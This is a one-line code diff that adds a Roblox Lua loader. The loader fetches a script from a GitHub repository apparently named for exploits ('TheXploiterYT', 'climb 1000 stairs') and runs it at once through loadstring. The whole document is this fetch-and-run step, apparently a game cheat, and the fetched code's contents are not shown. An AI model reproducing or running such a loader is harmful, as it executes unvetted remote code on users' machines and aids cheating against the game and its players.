@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TheXploiterYT/scripts/main/climb%201000%20stairs",true))()
